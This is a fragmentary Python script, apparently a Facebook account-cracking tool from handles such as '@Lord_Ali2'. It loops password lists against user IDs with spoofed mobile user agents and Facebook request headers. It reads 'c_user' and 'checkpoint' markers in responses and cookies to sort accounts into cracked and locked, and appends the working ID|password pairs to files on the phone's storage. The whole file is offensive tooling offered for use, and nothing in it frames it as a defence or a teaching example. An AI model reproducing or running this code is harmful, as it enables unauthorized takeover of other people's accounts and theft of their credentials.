...
'Mozilla/5.0 (Linux; Android 10; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
...
def fia():    
			print(logo)
			print('\x1b[1;97m>>> @Lord_Ali2 - @JJR2J')
			linex()
			print('[1] Crack File Clone\n[2] Crack Pak Random Clone ( Dont use it )\n[0] Exit')
			linex()
			xd=input('[*] Choose an option: ')
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/krar.txt')
				linex()
				...
				os.system('python open-sourse-Lord.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[Lord] %s|\033[0;92mOK:-%s \033[0;97m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[0;97m[vipkr0-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/@Lord_Ali2-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Kr3-OK] '+ids+' | '+pas+'\033[0;92m')
					
					open('/sdcard/krar313-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[0;92m[by Lord] %s|\033[1;92mOK:-%s \033[0;92m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[0;92m[@VIPKR0-OK] %s | %s'%(ids,pas))
				
				open('/sdcard/@Lord_Ali2-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;97m[LordAli] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Lord-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[0;92Lord\033[0;92m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryn4dBAvZv771buHnP',
    ...
    'x_fb_background_state': '1',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[حبيبي هاذ مقفول لا تفتحه-CP] '+cid+' | '+ps+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[بلعافية افتحه-OK] '+cid+' | '+ps+'\033[0;92m')
